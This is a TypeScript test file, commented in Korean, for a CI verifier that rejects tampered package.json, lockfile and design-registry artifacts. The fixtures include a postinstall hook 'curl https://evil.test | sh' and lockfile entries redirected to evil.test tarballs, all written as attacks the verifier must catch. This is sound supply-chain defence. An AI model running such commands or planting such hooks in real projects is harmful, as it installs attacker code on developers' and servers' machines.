import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { beforeEach, describe, expect, it } from "vitest";

/**
 * `scripts/propagate/verify-artifact.mjs` 단위 시험 — 2026-09-08 2차 리뷰 F4(P1).
 *
 * ★이 대조기가 막는 사고: 준비 job 에서는 **앱 코드가 돈다**(npm 스크립트·설계 등록부 생성기와
 *  그 의존성). 그 코드는 산출물 폴더를 마음대로 고칠 수 있는데, `verify-lock` 은 「핀이 새 SHA 인가」만
 *  보므로 아래가 전부 그냥 통과했다:
 *    · `package.json` 에 `postinstall` 을 끼워 넣기 → Railway 가 설치할 때 그 명령이 돈다
 *    · 잠금 파일의 `resolved` 를 **남의 tgz 주소**로 바꾸기 → 우리 코드 대신 남의 코드가 깔린다
 *    · 잠금 파일에 처음 보는 꾸러미 항목을 더하기 → 앱에 모르는 꾸러미가 들어온다
 *
 * ★판정 방식: 「나쁜 목록」이 아니라 **「기준 파일 + 핀 한 줄」과 깊은 비교**다.
 *  그래서 아직 상상 못 한 변조도 「기준과 다르다」로 걸린다. 시험도 그 성질을 재도록,
 *  정상 통과 1건 옆에 서로 다른 방식의 변조 5건을 둔다.
 */

const HERE = dirname(fileURLToPath(import.meta.url));
const SCRIPT = resolve(HERE, "../verify-artifact.mjs");
const REPO = "smlee-hash/wedly-policy-match-shared";
const NAME = "@wedly/policy-match-shared";
const OLD = "e7d0ed8fe9428b1c720f2f5675cd29a39e99e9b1";
const NEW = "b404b4b1f44d0ffb8213fff771a0bec090ca6257";
const SPEC = (sha: string) => `github:${REPO}#${sha}`;
const RESOLVED = (sha: string) => `git+ssh://git@github.com/${REPO}.git#${sha}`;
const ERP_PATHS = ["package.json", "package-lock.json", "src/lib/design-system/registry.generated.json"];

type Json = Record<string, unknown>;

/** 앱 저장소의 기준 파일 모양(ERP 를 줄여 놓은 것) */
function basePkg(): Json {
  return {
    name: "wedly-erp",
    scripts: { build: "npm run design:check && next build", "design:check": "node scripts/design-system/cli.mjs check" },
    dependencies: { next: "16.2.12", [NAME]: SPEC(OLD) },
  };
}

function baseLock(): Json {
  return {
    name: "wedly-erp",
    lockfileVersion: 3,
    packages: {
      "": { name: "wedly-erp", dependencies: { next: "16.2.12", [NAME]: SPEC(OLD) } },
      "node_modules/next": { version: "16.2.12", resolved: "https://registry.npmjs.org/next/-/next-16.2.12.tgz", integrity: "sha512-next" },
      [`node_modules/${NAME}`]: { version: "0.1.0", resolved: RESOLVED(OLD), integrity: "sha512-old" },
    },
  };
}

function write(dir: string, rel: string, body: string) {
  mkdirSync(dirname(join(dir, rel)), { recursive: true });
  writeFileSync(join(dir, rel), body);
}

const j = (v: unknown) => JSON.stringify(v, null, 2) + "\n";

interface ArtifactOpts {
  pkg?: (p: Json) => void;
  lock?: (l: Json) => void;
  registry?: string;
  extraFiles?: Record<string, string>;
  paths?: string[];
}

/** 기준 폴더와 「핀만 올린」 산출물 폴더를 만든 뒤, 산출물만 요청대로 비튼다 */
function fixture(tmp: string, opts: ArtifactOpts = {}) {
  const base = join(tmp, `base-${Math.random().toString(36).slice(2)}`);
  const art = join(tmp, `art-${Math.random().toString(36).slice(2)}`);
  mkdirSync(base, { recursive: true });
  mkdirSync(art, { recursive: true });

  write(base, "package.json", j(basePkg()));
  write(base, "package-lock.json", j(baseLock()));
  write(base, "src/lib/design-system/registry.generated.json", j({ pin: SPEC(OLD) }));

  // 봇이 정상적으로 만들었을 산출물(= 핀 한 줄만 새 SHA)
  const pkg = basePkg();
  (pkg.dependencies as Json)[NAME] = SPEC(NEW);
  const lock = baseLock();
  ((lock.packages as Json)[""] as Json).dependencies = { next: "16.2.12", [NAME]: SPEC(NEW) };
  (lock.packages as Json)[`node_modules/${NAME}`] = { version: "0.1.0", resolved: RESOLVED(NEW), integrity: "sha512-new" };

  opts.pkg?.(pkg);
  opts.lock?.(lock);
  write(art, "package.json", j(pkg));
  write(art, "package-lock.json", j(lock));
  write(art, "src/lib/design-system/registry.generated.json", opts.registry ?? j({ pin: SPEC(NEW) }));
  write(art, "meta.json", j({ app: "erp", result: "prepared" }));
  for (const [rel, body] of Object.entries(opts.extraFiles ?? {})) write(art, rel, body);

  return { base, art, paths: opts.paths ?? ERP_PATHS };
}

/**
 * H2 시험이 쓰는 표식 — **비밀이 아니다**(이름 그대로). 깨진 JSON 의 **첫 글자부터** 어긋나게 둔다:
 * V8 은 그때 입력 앞부분을 오류문에 담기 때문이다(가운데가 깨지면 위치만 적고 내용은 안 적는다).
 */
const CANARY = "PRIVATE_REVIEW_CANARY_NOT_A_SECRET";
const BROKEN = `${CANARY} 이 줄은 JSON 이 아니다\n`;

/** 「구문 오류는 고정 문구로만 적는다」를 잰다 — 표식도, 그 앞부분도 어디에도 없어야 한다 */
function expectNoLeak(r: { code: number | null; out: string; err: string }, where: string) {
  const all = `${r.out}\n${r.err}`;
  expect(r.code, all).toBe(1);
  expect(all, `${where}: 표식이 그대로 실렸습니다`).not.toContain(CANARY);
  expect(all, `${where}: 표식의 앞부분이 실렸습니다`).not.toContain(CANARY.slice(0, 9));
  expect(all, `${where}: 고정 문구가 없습니다`).toContain("JSON 구문 오류(내용은 표시하지 않음)");
}

function run(f: { base: string; art: string; paths: string[] }, sha = NEW) {
  const r = spawnSync("node", [SCRIPT, f.base, f.art, sha, ...f.paths], { encoding: "utf8" });
  return { code: r.status, out: r.stdout, err: r.stderr };
}

describe("verify-artifact.mjs", () => {
  let tmp: string;
  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "verify-artifact-"));
  });

  it("핀 한 줄만 바뀐 산출물은 0 — 대조기가 늘 빨간 것이 아니라는 확인", () => {
    const r = run(fixture(tmp));
    expect(r.code, r.err).toBe(0);
    expect(r.out).toContain("OK");
  });

  it("package.json 에 postinstall 을 끼워 넣으면 1 — Railway 가 그 명령을 돌리기 전에 막는다", () => {
    const r = run(fixture(tmp, { pkg: (p) => ((p.scripts as Json).postinstall = "curl https://evil.test | sh") }));
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/postinstall/);
    expect(r.err).toMatch(/기준에 없는 칸/);
  });

  it("잠금 파일의 resolved 가 남의 주소면 1 — 우리 저장소의 그 커밋만 받는다", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          ((l.packages as Json)[`node_modules/${NAME}`] as Json).resolved = "https://evil.test/pkg.tgz";
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/resolved 가 우리 저장소의 그 커밋이 아닙니다/);
  });

  it("잠금 파일 integrity 가 sha512 가 아니면 1", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          ((l.packages as Json)[`node_modules/${NAME}`] as Json).integrity = "sha1-짧음";
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/integrity 가 sha512 가 아닙니다/);
  });

  it("잠금 파일에 모르는 꾸러미 항목이 더해지면 1 — 무엇이 늘었는지 함께 알린다", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          (l.packages as Json)["node_modules/evil-loader"] = {
            version: "1.0.0",
            resolved: "https://evil.test/evil.tgz",
            integrity: "sha512-evil",
          };
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/node_modules\/evil-loader/);
  });

  it("우리 꾸러미 밖의 기존 항목을 고쳐도 1 — 「우리 자리」 말고는 아무것도 못 바꾼다", () => {
    const r = run(
      fixture(tmp, {
        lock: (l) => {
          ((l.packages as Json)["node_modules/next"] as Json).resolved = "https://evil.test/next.tgz";
        },
      }),
    );
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/node_modules\/next/);
  });

  it("커밋 대상이 아닌 파일이 산출물에 섞이면 1", () => {
    const r = run(fixture(tmp, { extraFiles: { "src/몰래.ts": "export const x = 1;\n" } }));
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/커밋 대상이 아닌 파일/);
    expect(r.err).toMatch(/src\/몰래\.ts/);
  });

  it("설계 등록부가 깨진 JSON 이면 1", () => {
    const r = run(fixture(tmp, { registry: "{ 이건 JSON 이 아니다" }));
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/JSON 이 아닙니다/);
  });

  it("핀이 이번 반영 SHA 가 아니면 1 — 옛 SHA 로 되돌린 산출물도 막는다", () => {
    const f = fixture(tmp);
    const r = run(f, OLD); // 기준과 같은 옛 SHA 로 대조하면 산출물(새 SHA)이 어긋난다
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/dependencies/);
  });

  it("커밋 대상 파일이 산출물에 없으면 1", () => {
    const f = fixture(tmp);
    const r = run({ ...f, paths: [...f.paths, "src/lib/design-system/없는파일.json"] });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/커밋 대상 파일이 없습니다/);
  });

  it("검증 규칙이 없는 파일을 커밋 대상에 넣으면 1 — 모르는 파일을 조용히 통과시키지 않는다", () => {
    const f = fixture(tmp, { extraFiles: { "next.config.ts": "export default {};\n" } });
    const r = run({ ...f, paths: [...f.paths, "next.config.ts"] });
    expect(r.code).toBe(1);
    expect(r.err).toMatch(/검증 규칙이 없는 파일/);
  });

  // ── 2026-09-08 3차 리뷰 G2(P2): 「읽기 성공」과 「값」은 다른 이야기다 ──

  it("산출물·기준 파일이 null·false·0·\"\" 이면 1 — 대조를 건너뛰고 통과하지 않는다", () => {
    // ★막는 사고: 옛 판은 `if (!base || !got) return;` 이라, 파일 내용이 JSON 으로는 읽히지만
    //  개체가 아닌 값(`null`·`false`·`0`·`""`)이면 **그 파일의 대조를 통째로 건너뛰고** 조용히 통과했다.
    //  「깊은 비교로 기준과 같아야 한다」는 이 대조기의 약속이 바로 그 자리에서 사라진다.
    for (const body of ["null", "false", "0", '""']) {
      const bad = fixture(tmp);
      write(bad.art, "package.json", body);
      const r = run(bad);
      expect(r.code, `산출물 package.json=${body}`).toBe(1);
      expect(r.err).toMatch(/최상위가 개체가 아닙니다/);

      const badLock = fixture(tmp);
      write(badLock.art, "package-lock.json", body);
      const r2 = run(badLock);
      expect(r2.code, `산출물 package-lock.json=${body}`).toBe(1);
      expect(r2.err).toMatch(/최상위가 개체가 아닙니다/);

      const badBase = fixture(tmp);
      write(badBase.base, "package.json", body);
      const r3 = run(badBase);
      expect(r3.code, `기준 package.json=${body}`).toBe(1);
      expect(r3.err).toMatch(/최상위가 개체가 아닙니다/);
    }
  });

  // ── 2026-09-08 4차 리뷰 H2(P2): 깨진 JSON 의 앞부분이 공개 로그로 새지 않는다 ──

  it("깨진 JSON 을 넣어도 그 내용이 stdout·stderr 어디에도 안 실린다 — 산출물·기준·등록부 셋 다", () => {
    // ★막는 사고: `JSON.parse` 의 오류문에는 **입력의 앞부분이 그대로 들어간다**
    //  (node 22 실측: `Unexpected token 'P', "PRIVATE_RE"... is not valid JSON`).
    //  이 대조기는 값을 `shown` 으로 가려 찍으면서도 **읽다 죽은 자리에서는 원문을 그대로 적었다** —
    //  준비 단계에서 도는 앱 코드가 깨진 파일 하나로 앱의 비밀을 공개 로그에 실어 보낼 수 있었다.
    // ★재는 방식: 표식 전체는 애초에 오류문에 다 안 들어간다(V8 이 10여 글자에서 자른다).
    //  그래서 **표식의 앞 9글자**까지 함께 본다 — 이 줄이 옛 코드에서 실제로 빨개지는 자리다.
    const artPkg = fixture(tmp);
    write(artPkg.art, "package.json", BROKEN);
    expectNoLeak(run(artPkg), "산출물 package.json");

    const artLock = fixture(tmp);
    write(artLock.art, "package-lock.json", BROKEN);
    expectNoLeak(run(artLock), "산출물 package-lock.json");

    const basePkgBroken = fixture(tmp);
    write(basePkgBroken.base, "package.json", BROKEN);
    expectNoLeak(run(basePkgBroken), "기준 package.json");

    // 등록부는 「JSON 으로 읽히는가」만 보는 갈래라 읽기 경로가 따로다 — 거기도 같은 규칙이어야 한다
    const registry = fixture(tmp, { registry: BROKEN });
    expectNoLeak(run(registry), "산출물 registry.generated.json");
  });

  it("인자가 모자라거나 SHA 형식이 아니면 2(사용법 오류)", () => {
    const f = fixture(tmp);
    expect(spawnSync("node", [SCRIPT, f.base, f.art, "b404b4b", ...f.paths], { encoding: "utf8" }).status).toBe(2);
    expect(spawnSync("node", [SCRIPT, f.base, f.art, NEW], { encoding: "utf8" }).status).toBe(2);
  });
});
